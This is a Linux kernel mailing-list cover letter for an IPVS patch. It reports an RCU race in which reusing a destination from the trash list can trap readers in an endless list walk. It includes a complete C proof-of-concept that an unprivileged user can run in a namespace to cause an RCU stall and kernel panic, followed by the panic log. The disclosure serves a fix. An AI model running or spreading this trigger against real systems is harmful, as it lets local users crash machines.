Received: from mail-pj2-f12.google.com (mail-pj2-f12.google.com [74.125.227.140])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 0B3AF4E66B9
	for <lvs-devel@vger.kernel.org>; Fri, 25 Sep 2026 19:37:04 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.140
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1790365027; cv=none; b=nPvmqZqWvfKiHBfXoZgDI1MX89AxHLhNFjOvDQEjC1eA4g/dbCzX4n+I7kwg446xBTF6qnLGN5NsyHdac51kdsCvRdqvDU/3Beb2kSg/ERhQ0JRamwP6aXb0w8+nVJI3sGCPYYriFD6S6EsL/3aKYqei7wnh/UqIFQMdiR9wARo=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1790365027; c=relaxed/simple;
	bh=U+0S+8OVJscXrvE0NBPVb6xwj1D32f2CiDEq1/y7idM=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=q5k7hJLYBJS5Z+mXjoFxE7nQHvNMLRA3HT66QsQaScnQ8ikLH/Omh8uCSX+RtPR8ILIh66tESddlGe79Hx8M4HlXL/Ypu3+NlU/pPYJJWSK1qcD9OWyaodPh/pCLFsWKQqxFpDqCVXW1213cS0OOOfAnPz0ouLg6UiGJ55xQvFQ=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=tcdV/FFa; arc=none smtp.client-ip=74.125.227.140
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="tcdV/FFa"
Received: by mail-pj2-f12.google.com with SMTP id 98e67ed59e1d1-398cb5615deso1055239a91.3
        for <lvs-devel@vger.kernel.org>; Fri, 25 Sep 2026 12:37:04 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1790365024; x=1790969824; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=WtagpOcJ+YQ+NVYo9xdd/0zApcDgU7RbJK5eGA+L6yA=;
        b=tcdV/FFaur+fAP3mK4mlzFIWLGJL/us6teZc+siBG4h9bZr8ZrJ/bxY3DbwcP6PVu8
         B0YcAfi25n5E6I76MdKoWzIu/EszRWdJ2GimlHzunRZHADKhTOwrSmiDkzHgCeAq4T+p
         bwOmVzZBveRI8g1/LqQ64BWJ/eXuFWe7zWNTcDTnM26BMyaqa50fRqcX7DVOoZtvpB9K
         UNLDrebXHWompYTk1IX/rhsuIGRE4fl5EPzhSs4gxpQjM54LShI0FTsNAxUMcFY+PRyi
         P9qLI2V3vSib6egXPbwk0zEO05aawUVF+Wez3qUbu1qergLeaIjEjCHeR7hjoo2/1dQx
         iU5g==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1790365024; x=1790969824;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=WtagpOcJ+YQ+NVYo9xdd/0zApcDgU7RbJK5eGA+L6yA=;
        b=W77hrPgpdC9OoIIS1ktMuQ+dYyDWOOeHYroQXPNOe+IS0sC4GDr/74A37GQGeTx1Xq
         qE1pdrnckGI9ESIUFMVjUGypBLk7AUDcs1HhbCenAqjIjchpOgZdfwTNsL5Ov0nTEGGj
         ewvdmNwjBjBmaLVyVYE+iAQ/NfTB9STzGXmOoWuFobYSxRdkZDtbvQ/skOMenflfTnYR
         QJ77OSqvkFKKAszNN3WR9fy+87h3Yb84gAWf3Rp+6XFVF+hBPWVZiAjwWHPOVO5DEg5K
         R/VT/+9tKxev8GIwy3CaKslG9/exvvJxyOxH/YSfMD8UYMtTC/NCP+L7jklT50l6WAwB
         t9kQ==
X-Gm-Message-State: AFuF++k2CTuqFJaipv/f9Po0JjnSX/9wtIFancs+Bv/p+Q5+azMSShle
	hy7832s0dMZVoiLo5gc3kuJ8T3nKC1xXW9G2VcL7X5+tZuiYsebDOGBe8zZBkcqPWOudQ4JKvTH
	LOOjv+A==
X-Gm-Gg: AYBFou2H/sIWJ65HuvOwnov1DKGwgeB0RvaVVRF05CSVxv6s6uo4NXW7FziJgJRezMz
	ml/2T1L17HsbeJ4RwwMVFg2PCNNNXB5oh7KrGNyEJYJPVLNOAGbqfNqMcRilWgv4vQWDtHycuIR
	L4OlgLTYF5s61ZWJR6S5GgfHAj1y1fbEBdxQYC0xMU8+l6Xl/ExaYjBETefbynwIZ73XClw6QfF
	gpKQ25kGqgJ9LS8ppEZ5dgPIdpLXzgRfy/3ZDlfyaiqUBmwenl4urS268WjD7t9ub72efUSVcH3
	siVNdwOwGlQJuGJve4qVvFAluOl8gcRiK6Nxo3CXtMMM86UrqYT9w6sCx3i04RrVaSP2KSVSBYE
	iyf1yUw42Dh3URORdEMCjp7zfWoETF+C+MFCWKjC9GLedRBIcBGeEFvTqTDZ9wg68TNzAIWkSeU
	ZfRIy8Ep9IyQSR+BK9lcw0WIE3fTYGhPTrSOq+JtMPh0N9YXKc4Vuzi2hMTy954vAjGeBOgwF2q
	VwvtN0S6aY=
X-Received: by 2002:a17:90b:5544:b0:3a0:ad24:c0aa with SMTP id 98e67ed59e1d1-3a0ad24c0f7mr4500014a91.25.1790365023889;
        Fri, 25 Sep 2026 12:37:03 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([240e:37a:1253:e500:95a:bb1c:29d9:90fa])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3a0b9892dbfsm6086657a91.11.2026.09.25.12.36.58
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Fri, 25 Sep 2026 12:37:02 -0700 (PDT)
From: Ren Wei <weir@nebusec.ai>
To: lvs-devel@vger.kernel.org,
	netfilter-devel@vger.kernel.org,
	Julian Anastasov <ja@ssi.bg>
Cc: dsahern@kernel.org,
	idosch@nvidia.com,
	horms@verge.net.au,
	davem@davemloft.net,
	edumazet@google.com,
	kuba@kernel.org,
	pabeni@redhat.com,
	pablo@netfilter.org,
	fw@strlen.de,
	phil@nwl.cc,
	vega@nebusec.ai,
	zzyy19904204639@163.com,
	jiayuan.chen@linux.dev,
	weir@nebusec.ai
Subject: [PATCH nf v2 0/1] ipvs: wait grace period while reusing dest from trash
Date: Sat, 26 Sep 2026 03:36:54 +0800
Message-ID: <cover.1789473164.git.zzyy19904204639@163.com>
X-Mailer: git-send-email 2.53.0
Precedence: bulk
X-Mailing-List: lvs-devel@vger.kernel.org
List-Id: <lvs-devel.vger.kernel.org>
List-Subscribe: <mailto:lvs-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:lvs-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Darong Lu <zzyy19904204639@163.com>

Hi Linux kernel maintainers,

We found and validated an issue in net/netfilter/ipvs/ip_vs_twos.c. The
bug is reachable by a non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

An IPVS destination is removed from one service with list_del_rcu() and may
then be reused from dest_trash in another service before an RCU grace period
has elapsed. The same n_list node is consequently relinked with
list_add_rcu().

An RCU reader that already holds the removed destination can follow its new
n_list pointer into the new service. The reader still compares the current
entry with the old service's list head. When it reaches the new list head,
that head is not equal to the old head and is interpreted as a
struct ip_vs_dest by list_entry_rcu(). The reader can therefore continue
around the new circular list indefinitely.

This race does not require two complete list walks. A single unbounded
list_for_each_entry_rcu() is sufficient, and the same lifetime problem can
affect other IPVS schedulers and destination-list readers.

The fix records an RCU grace-period cookie when destinations are unlinked
and moved to a temporary trash list. Before a destination is reused, a
conditional grace-period wait ensures that readers of the old n_list and
d_list links have completed. Bulk service deletion and flush operations
record one cookie for all removed destinations and splice them into the
public destination trash with one lock acquisition.

Destination edits that rehash a real server use the same cookie mechanism.
This fixes destination-list and real-server hash-table readers without
scheduler-specific bounds, while avoiding a new grace-period wait when a
destination is merely returned to the trash after an estimator error.

Reproducer:

    gcc -O2 -static -o poc poc.c
    unshare -Urn ./poc

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/sysinfo.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define IP_VS_BASE_CTL          (64 + 1024 + 64)
#define IP_VS_SO_SET_ADD        (IP_VS_BASE_CTL + 2)
#define IP_VS_SO_SET_DEL        (IP_VS_BASE_CTL + 4)
#define IP_VS_SO_SET_FLUSH      (IP_VS_BASE_CTL + 5)
#define IP_VS_SO_SET_ADDDEST    (IP_VS_BASE_CTL + 7)
#define IP_VS_SO_SET_TIMEOUT    (IP_VS_BASE_CTL + 10)

#define IP_VS_CONN_F_MASQ       0x0000
#define IP_VS_SVC_F_ONEPACKET   0x0004
#define IP_VS_SCHEDNAME_MAXLEN  16

#define DEFAULT_SERVICE_IP      "127.0.0.100"
#define DEFAULT_SERVICE_PORT    4242
#define DEFAULT_DEST_PORT       9000
#define DEFAULT_DESTS           128
#define DEFAULT_SENDERS         3
#define DEFAULT_DURATION        0
#define SOCKETS_PER_SENDER      128

struct ip_vs_service_user {
	uint16_t protocol;
	uint32_t addr;
	uint16_t port;
	uint32_t fwmark;
	char sched_name[IP_VS_SCHEDNAME_MAXLEN];
	unsigned int flags;
	unsigned int timeout;
	uint32_t netmask;
};

struct ip_vs_dest_user {
	uint32_t addr;
	uint16_t port;
	unsigned int conn_flags;
	int weight;
	uint32_t u_threshold;
	uint32_t l_threshold;
};

struct ip_vs_svcdest_user {
	struct ip_vs_service_user s;
	struct ip_vs_dest_user d;
};

struct ip_vs_timeout_user {
	int tcp_timeout;
	int tcp_fin_timeout;
	int udp_timeout;
};

struct config_thread_arg {
	int ctl_fd;
	struct ip_vs_service_user svc;
	int dest_count;
	unsigned int cpu;
};

struct sender_thread_arg {
	struct sockaddr_in dst;
	unsigned int cpu;
	unsigned int thread_id;
};

static volatile sig_atomic_t stop_flag;
static volatile unsigned long long packet_count;
static volatile unsigned long long cycle_count;

static void on_signal(int signo)
{
	(void)signo;
	stop_flag = 1;
}

static int pin_to_cpu(unsigned int cpu)
{
	cpu_set_t mask;

	CPU_ZERO(&mask);
	CPU_SET(cpu, &mask);
	return sched_setaffinity(0, sizeof(mask), &mask);
}

static int ipvs_set_timeout(int fd)
{
	struct ip_vs_timeout_user timeout_cfg = {
		.tcp_timeout = 1,
		.tcp_fin_timeout = 1,
		.udp_timeout = 1,
	};

	return setsockopt(fd, IPPROTO_IP, IP_VS_SO_SET_TIMEOUT, &timeout_cfg,
			  sizeof(timeout_cfg));
}

static int ipvs_flush(int fd)
{
	return setsockopt(fd, IPPROTO_IP, IP_VS_SO_SET_FLUSH, NULL, 0);
}

static int ipvs_add_service(int fd, const struct ip_vs_service_user *svc)
{
	return setsockopt(fd, IPPROTO_IP, IP_VS_SO_SET_ADD, svc, sizeof(*svc));
}

static int ipvs_del_service(int fd, const struct ip_vs_service_user *svc)
{
	return setsockopt(fd, IPPROTO_IP, IP_VS_SO_SET_DEL, svc, sizeof(*svc));
}

static uint32_t make_dest_ip(int idx)
{
	unsigned int host = (unsigned int)idx + 1;
	unsigned int octet3 = (host / 254u) & 0xffu;
	unsigned int octet4 = (host % 254u) + 1u;
	uint32_t addr = (198u << 24) | (18u << 16) | (octet3 << 8) | octet4;

	return htonl(addr);
}

static int ipvs_add_dest(int fd, const struct ip_vs_service_user *svc, int idx)
{
	struct ip_vs_svcdest_user entry;

	memset(&entry, 0, sizeof(entry));
	entry.s = *svc;
	entry.d.addr = make_dest_ip(idx);
	entry.d.port = htons(DEFAULT_DEST_PORT);
	entry.d.conn_flags = IP_VS_CONN_F_MASQ;
	entry.d.weight = 1;

	return setsockopt(fd, IPPROTO_IP, IP_VS_SO_SET_ADDDEST, &entry,
			  sizeof(entry));
}

static int setup_initial_config(int fd, const struct ip_vs_service_user *svc,
				int dest_count)
{
	int i;

	if (ipvs_flush(fd) < 0 && errno != ENOENT) {
		perror("IP_VS_SO_SET_FLUSH");
		return -1;
	}

	if (ipvs_set_timeout(fd) < 0)
		perror("IP_VS_SO_SET_TIMEOUT");

	if (ipvs_add_service(fd, svc) < 0) {
		perror("IP_VS_SO_SET_ADD");
		return -1;
	}

	for (i = 0; i < dest_count; i++) {
		if (ipvs_add_dest(fd, svc, i) < 0) {
			fprintf(stderr, "IP_VS_SO_SET_ADDDEST[%d]: %s\n", i,
				strerror(errno));
			return -1;
		}
	}

	return 0;
}

static void *config_thread(void *arg)
{
	struct config_thread_arg *cfg = arg;
	unsigned long long local_cycles = 0;

	if (pin_to_cpu(cfg->cpu) < 0)
		perror("sched_setaffinity(config)");

	while (!stop_flag) {
		int i;

		if (ipvs_del_service(cfg->ctl_fd, &cfg->svc) < 0 &&
		    errno != ESRCH && errno != ENOENT) {
			perror("IP_VS_SO_SET_DEL");
			stop_flag = 1;
			break;
		}

		if (ipvs_add_service(cfg->ctl_fd, &cfg->svc) < 0) {
			perror("IP_VS_SO_SET_ADD");
			stop_flag = 1;
			break;
		}

		for (i = 0; i < cfg->dest_count; i++) {
			if (ipvs_add_dest(cfg->ctl_fd, &cfg->svc, i) < 0) {
				fprintf(stderr, "IP_VS_SO_SET_ADDDEST[%d]: %s\n",
					i, strerror(errno));
				stop_flag = 1;
				break;
			}
		}

		if (stop_flag)
			break;

		local_cycles++;
		__atomic_store_n(&cycle_count, local_cycles, __ATOMIC_RELAXED);

		if ((local_cycles & 0xfffULL) == 0) {
			fprintf(stderr, "[config] cycles=%llu packets=%llu\n",
				local_cycles,
				__atomic_load_n(&packet_count, __ATOMIC_RELAXED));
		}
	}

	return NULL;
}

static void *sender_thread(void *arg)
{
	struct sender_thread_arg *cfg = arg;
	int fds[SOCKETS_PER_SENDER];
	unsigned char payload[16] = "twos-race-packet";
	unsigned int seq = 0;
	unsigned int i;

	for (i = 0; i < SOCKETS_PER_SENDER; i++)
		fds[i] = -1;

	if (pin_to_cpu(cfg->cpu) < 0)
		perror("sched_setaffinity(sender)");

	for (i = 0; i < SOCKETS_PER_SENDER; i++) {
		struct sockaddr_in src;
		unsigned int port = 10000u + cfg->thread_id * SOCKETS_PER_SENDER + i;

		fds[i] = socket(AF_INET, SOCK_DGRAM, 0);
		if (fds[i] < 0) {
			perror("socket(AF_INET, SOCK_DGRAM)");
			stop_flag = 1;
			return NULL;
		}

		memset(&src, 0, sizeof(src));
		src.sin_family = AF_INET;
		src.sin_port = htons((uint16_t)port);
		src.sin_addr.s_addr = inet_addr("127.0.0.1");

		if (bind(fds[i], (const struct sockaddr *)&src, sizeof(src)) < 0) {
			perror("bind(sender)");
			stop_flag = 1;
			goto out_close;
		}
	}

	while (!stop_flag) {
		unsigned int slot = seq % SOCKETS_PER_SENDER;

		if (sendto(fds[slot], payload, sizeof(payload), 0,
			   (const struct sockaddr *)&cfg->dst,
			   sizeof(cfg->dst)) < 0) {
			if (errno == EINTR)
				continue;
			if (errno != EPERM && errno != EHOSTUNREACH &&
			    errno != ENETUNREACH && errno != ECONNREFUSED) {
				perror("sendto(udp)");
				stop_flag = 1;
				break;
			}
		}

		seq++;
		__atomic_add_fetch(&packet_count, 1, __ATOMIC_RELAXED);
	}

out_close:
	for (i = 0; i < SOCKETS_PER_SENDER; i++) {
		if (fds[i] >= 0)
			close(fds[i]);
	}
	return NULL;
}

static int bring_up_loopback(void)
{
	int ret;

	ret = system("ip link set lo up >/dev/null 2>&1 && "
		     "ip addr add 127.0.0.100/8 dev lo >/dev/null 2>&1 || true");
	if (ret == -1)
		return -1;
	return WEXITSTATUS(ret);
}

static void usage(const char *prog)
{
	fprintf(stderr,
		"Usage: %s [-d dests] [-s senders] [-t duration_seconds]\n",
		prog);
}

int main(int argc, char **argv)
{
	int opt;
	int dest_count = DEFAULT_DESTS;
	int sender_count = DEFAULT_SENDERS;
	int duration = DEFAULT_DURATION;
	int ctl_fd = -1;
	int cpu_count;
	struct ip_vs_service_user svc;
	struct config_thread_arg cfg;
	struct sender_thread_arg *senders = NULL;
	int started_senders = 0;
	bool cfg_started = false;
	bool failed = false;
	pthread_t cfg_thread;
	pthread_t *sender_threads = NULL;
	time_t deadline = 0;
	int i;

	while ((opt = getopt(argc, argv, "d:s:t:h")) != -1) {
		switch (opt) {
		case 'd':
			dest_count = atoi(optarg);
			break;
		case 's':
			sender_count = atoi(optarg);
			break;
		case 't':
			duration = atoi(optarg);
			break;
		case 'h':
		default:
			usage(argv[0]);
			return opt == 'h' ? 0 : 1;
		}
	}

	if (dest_count <= 0 || sender_count <= 0 || duration < 0) {
		usage(argv[0]);
		return 1;
	}

	if (bring_up_loopback() != 0) {
		fprintf(stderr, "failed to bring up loopback with ip(8)\n");
		return 1;
	}

	signal(SIGINT, on_signal);
	signal(SIGTERM, on_signal);

	cpu_count = get_nprocs();
	if (cpu_count < 2)
		cpu_count = 2;

	ctl_fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (ctl_fd < 0) {
		perror("socket(AF_INET, SOCK_DGRAM)");
		return 1;
	}

	memset(&svc, 0, sizeof(svc));
	svc.protocol = IPPROTO_UDP;
	svc.addr = inet_addr(DEFAULT_SERVICE_IP);
	svc.port = htons(DEFAULT_SERVICE_PORT);
	svc.flags = IP_VS_SVC_F_ONEPACKET;
	strncpy(svc.sched_name, "twos", sizeof(svc.sched_name) - 1);

	if (setup_initial_config(ctl_fd, &svc, dest_count) < 0)
		goto out;

	memset(&cfg, 0, sizeof(cfg));
	cfg.ctl_fd = ctl_fd;
	cfg.svc = svc;
	cfg.dest_count = dest_count;
	cfg.cpu = (unsigned int)(cpu_count - 1);

	senders = calloc((size_t)sender_count, sizeof(*senders));
	sender_threads = calloc((size_t)sender_count, sizeof(*sender_threads));
	if (!senders || !sender_threads) {
		perror("calloc");
		goto out;
	}

	if (pthread_create(&cfg_thread, NULL, config_thread, &cfg) != 0) {
		perror("pthread_create(config)");
		failed = true;
		goto out;
	}
	cfg_started = true;

	for (i = 0; i < sender_count; i++) {
		memset(&senders[i], 0, sizeof(senders[i]));
		senders[i].dst.sin_family = AF_INET;
		senders[i].dst.sin_port = htons(DEFAULT_SERVICE_PORT);
		senders[i].dst.sin_addr.s_addr = inet_addr(DEFAULT_SERVICE_IP);
		senders[i].cpu = (unsigned int)(i % (cpu_count - 1));
		senders[i].thread_id = (unsigned int)i + 1u;

		if (pthread_create(&sender_threads[i], NULL, sender_thread,
				   &senders[i]) != 0) {
			perror("pthread_create(sender)");
			stop_flag = 1;
			failed = true;
			break;
		}
		started_senders++;
	}

	if (duration > 0)
		deadline = time(NULL) + duration;

	while (!stop_flag) {
		sleep(1);
		if (deadline && time(NULL) >= deadline)
			stop_flag = 1;
	}

	fprintf(stderr, "[done] cycles=%llu packets=%llu\n",
		__atomic_load_n(&cycle_count, __ATOMIC_RELAXED),
		__atomic_load_n(&packet_count, __ATOMIC_RELAXED));

	if (cfg_started)
		pthread_join(cfg_thread, NULL);
	for (i = 0; i < started_senders; i++) {
		if (sender_threads)
			pthread_join(sender_threads[i], NULL);
	}

out:
	if (ctl_fd >= 0)
		close(ctl_fd);
	free(senders);
	free(sender_threads);
	return failed ? 1 : 0;
}
------END poc.c--------

----BEGIN crash log----
[  308.939009][    C2] Kernel panic - not syncing: RCU Stall
[  308.939533][    C2] CPU: 2 UID: 0 PID: 10514 Comm: poc Not tainted 6.12.95 #2
[  308.940019][    C2] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  308.940796][    C2] Call Trace:
[  308.941009][    C2]  <IRQ>
[  308.941207][    C2]  panic+0x533/0x610
[  308.941486][    C2]  ? __pfx_panic+0x10/0x10
[  308.941796][    C2]  ? __pv_queued_spin_unlock_slowpath+0x191/0x2f0
[  308.942227][    C2]  ? rcu_sched_clock_irq+0x2753/0x3020
[  308.942588][    C2]  ? srso_alias_return_thunk+0x5/0xfbef5
[  308.942942][    C2]  ? __raw_callee_save___pv_queued_spin_unlock_slowpath+0x15/0x30
[  308.943482][    C2]  rcu_sched_clock_irq+0x2efb/0x3020
[  308.943847][    C2]  ? __pfx___lock_acquire+0x10/0x10
[  308.944195][    C2]  ? __pfx_rcu_sched_clock_irq+0x10/0x10
[  308.944559][    C2]  ? srso_alias_return_thunk+0x5/0xfbef5
[  308.944976][    C2]  ? srso_alias_return_thunk+0x5/0xfbef5
[  308.945367][    C2]  ? srso_alias_return_thunk+0x5/0xfbef5
[  308.945754][    C2]  ? srso_alias_return_thunk+0x5/0xfbef5
[  308.946128][    C2]  update_process_times+0x123/0x1c0
[  308.946483][    C2]  ? __pfx_update_process_times+0x10/0x10
[  308.946852][    C2]  ? srso_alias_return_thunk+0x5/0xfbef5
[  308.947228][    C2]  ? srso_alias_return_thunk+0x5/0xfbef5
[  308.947601][    C2]  ? ktime_get+0xab/0x200
[  308.947898][    C2]  tick_nohz_handler+0x1b1/0x460
[  308.948241][    C2]  ? do_raw_spin_unlock+0x177/0x230
[  308.948581][    C2]  ? __pfx_tick_nohz_handler+0x10/0x10
[  308.948935][    C2]  __hrtimer_run_queues+0x460/0x830
[  308.949295][    C2]  ? __pfx___hrtimer_run_queues+0x10/0x10
[  308.949658][    C2]  ? srso_alias_return_thunk+0x5/0xfbef5
[  308.950035][    C2]  ? ktime_get_update_offsets_now+0xcd/0x3b0
[  308.950439][    C2]  hrtimer_interrupt+0x2e7/0x7f0
[  308.950784][    C2]  ? __pfx_handle_softirqs+0x10/0x10
[  308.951162][    C2]  __sysvec_apic_timer_interrupt+0x112/0x400
[  308.951564][    C2]  sysvec_apic_timer_interrupt+0x9e/0xc0
[  308.951922][    C2]  </IRQ>
[  308.952116][    C2]  <TASK>
[  308.952321][    C2]  asm_sysvec_apic_timer_interrupt+0x1a/0x20
[  308.952721][    C2] RIP: 0010:lock_acquire.part.0+0x153/0x370
[  308.953092][    C2] Code: b8 ff ff ff ff 65 0f c1 05 32 1b a0 7e 83 f8 01 0f 85 cc 01 00 00 9c 58 f6 c4 02 0f 85 e1 01 00 00 48 85 ed 0f 85 b2 01 00 00 <48> b8 00 00 00 00 00 fc ff df 48 01 c3 48 c7 03 00 00 00 00 48 c7
[  308.954328][    C2] RSP: 0018:ffffc9001403ef98 EFLAGS: 00000206
[  308.954787][    C2] RAX: 0000000000000046 RBX: 1ffff92002807df4 RCX: 1ffffffff2c69d6e
[  308.955316][    C2] RDX: 0000000000000001 RSI: ffffffff8a8c49a0 RDI: ffffffff8aee7960
[  308.955822][    C2] RBP: 0000000000000200 R08: 0000000000000000 R09: fffffbfff2c69990
[  308.956327][    C2] R10: ffffffff9634cc87 R11: 0000000000000001 R12: 0000000000000000
[  308.956833][    C2] R13: ffffffff8e1b3680 R14: 0000000000000000 R15: 0000000000000000
[  308.957370][    C2]  ? __pfx_lock_acquire.part.0+0x10/0x10
[  308.957728][    C2]  ? srso_alias_return_thunk+0x5/0xfbef5
[  308.958082][    C2]  ? rcu_is_watching+0x12/0xc0
[  308.958420][    C2]  ? srso_alias_return_thunk+0x5/0xfbef5
[  308.958787][    C2]  ? trace_lock_acquire+0x145/0x1c0
[  308.959119][    C2]  ? is_bpf_text_address+0x21/0x100
[  308.959479][    C2]  ? srso_alias_return_thunk+0x5/0xfbef5
[  308.959836][    C2]  ? lock_acquire+0x2f/0xb0
[  308.960130][    C2]  ? is_bpf_text_address+0x21/0x100
[  308.960469][    C2]  ? __pfx_stack_trace_consume_entry+0x10/0x10
[  308.960867][    C2]  is_bpf_text_address+0x35/0x100
[  308.961196][    C2]  ? is_bpf_text_address+0x21/0x100
[  308.961527][    C2]  kernel_text_address+0x153/0x170
[  308.961864][    C2]  __kernel_text_address+0x12/0x40
[  308.962194][    C2]  unwind_get_return_address+0x5e/0xa0
[  308.962544][    C2]  arch_stack_walk+0xac/0x100
[  308.962868][    C2]  stack_trace_save+0x9a/0xd0
[  308.963180][    C2]  ? __pfx_stack_trace_save+0x10/0x10
[  308.963534][    C2]  ? srso_alias_return_thunk+0x5/0xfbef5
[  308.963888][    C2]  ? lock_acquire.part.0+0x119/0x370
[  308.964231][    C2]  ? srso_alias_return_thunk+0x5/0xfbef5
[  308.964583][    C2]  kasan_save_stack+0x33/0x60
[  308.964899][    C2]  ? kasan_save_stack+0x33/0x60
[  308.965220][    C2]  ? kasan_save_track+0x14/0x30
[  308.965527][    C2]  ? kasan_save_free_info+0x3b/0x60
[  308.965860][    C2]  ? __kasan_slab_free+0x4f/0x70
[  308.966181][    C2]  ? kfree+0x14a/0x4a0
[  308.966455][    C2]  ? skb_release_data+0x447/0x690
[  308.966779][    C2]  ? sk_skb_reason_drop+0xb0/0x100
[  308.967108][    C2]  ? ip_vs_nat_xmit+0x4bc/0xb00
[  308.967441][    C2]  ? ip_vs_in_hook+0x986/0x2430
[  308.967744][    C2]  ? nf_hook_slow+0xa9/0x1f0
[  308.968032][    C2]  ? nf_hook+0x1fe/0x4e0
[  308.968310][    C2]  ? __ip_local_out+0x2df/0x660
[  308.968621][    C2]  ? ip_send_skb+0x4a/0x200
[  308.968906][    C2]  ? udp_send_skb+0x604/0x1980
[  308.969224][    C2]  ? udp_sendmsg+0x1582/0x2370
[  308.969527][    C2]  ? __sys_sendto+0x32e/0x3a0
[  308.969835][    C2]  ? __x64_sys_sendto+0xe0/0x1c0
[  308.970144][    C2]  ? do_syscall_64+0xc7/0x270
[  308.970451][    C2]  ? entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  308.970894][    C2]  kasan_save_track+0x14/0x30
[  308.971201][    C2]  kasan_save_free_info+0x3b/0x60
[  308.971518][    C2]  __kasan_slab_free+0x4f/0x70
[  308.971821][    C2]  kfree+0x14a/0x4a0
[  308.972077][    C2]  ? skb_release_data+0x447/0x690
[  308.972429][    C2]  skb_release_data+0x447/0x690
[  308.972732][    C2]  ? srso_alias_return_thunk+0x5/0xfbef5
[  308.973080][    C2]  ? sock_wfree+0x319/0x5c0
[  308.973387][    C2]  sk_skb_reason_drop+0xb0/0x100
[  308.973728][    C2]  ip_vs_nat_xmit+0x4bc/0xb00
[  308.974058][    C2]  ? __pfx_ip_vs_conn_in_get_proto+0x10/0x10
[  308.974443][    C2]  ? __pfx_ip_vs_nat_xmit+0x10/0x10
[  308.974769][    C2]  ? ip_vs_in_hook+0x1003/0x2430
[  308.975099][    C2]  ? __local_bh_enable_ip+0xa7/0x120
[  308.975453][    C2]  ip_vs_in_hook+0x986/0x2430
[  308.975754][    C2]  ? srso_alias_return_thunk+0x5/0xfbef5
[  308.976113][    C2]  ? ip_vs_out_hook+0x939/0x1b30
[  308.976453][    C2]  ? __pfx_ip_vs_in_hook+0x10/0x10
[  308.976782][    C2]  ? __pfx_ip_vs_out_hook+0x10/0x10
[  308.977120][    C2]  ? srso_alias_return_thunk+0x5/0xfbef5
[  308.977502][    C2]  ? srso_alias_return_thunk+0x5/0xfbef5
[  308.977872][    C2]  ? srso_alias_return_thunk+0x5/0xfbef5
[  308.978264][    C2]  ? srso_alias_return_thunk+0x5/0xfbef5
[  308.978622][    C2]  ? rcu_is_watching+0x12/0xc0
[  308.978935][    C2]  ? srso_alias_return_thunk+0x5/0xfbef5
[  308.979312][    C2]  ? trace_lock_acquire+0x145/0x1c0
[  308.979644][    C2]  ? srso_alias_return_thunk+0x5/0xfbef5
[  308.980010][    C2]  nf_hook_slow+0xa9/0x1f0
[  308.980322][    C2]  ? __pfx_dst_output+0x10/0x10
[  308.980675][    C2]  nf_hook+0x1fe/0x4e0
[  308.980953][    C2]  ? __pfx_nf_hook+0x10/0x10
[  308.981272][    C2]  ? __pfx_dst_output+0x10/0x10
[  308.981584][    C2]  ? srso_alias_return_thunk+0x5/0xfbef5
[  308.981943][    C2]  ? ip_make_skb+0x231/0x2d0
[  308.982261][    C2]  __ip_local_out+0x2df/0x660
[  308.982562][    C2]  ? __pfx_dst_output+0x10/0x10
[  308.982878][    C2]  ip_send_skb+0x4a/0x200
[  308.983173][    C2]  udp_send_skb+0x604/0x1980
[  308.983486][    C2]  udp_sendmsg+0x1582/0x2370
[  308.983788][    C2]  ? __pfx_aa_label_sk_perm+0x10/0x10
[  308.984137][    C2]  ? __pfx_ip_generic_getfrag+0x10/0x10
[  308.984507][    C2]  ? __pfx_udp_sendmsg+0x10/0x10
[  308.984840][    C2]  ? srso_alias_return_thunk+0x5/0xfbef5
[  308.985222][    C2]  ? srso_alias_return_thunk+0x5/0xfbef5
[  308.985574][    C2]  ? find_held_lock+0x2d/0x110
[  308.985892][    C2]  ? __pfx_lock_release+0x10/0x10
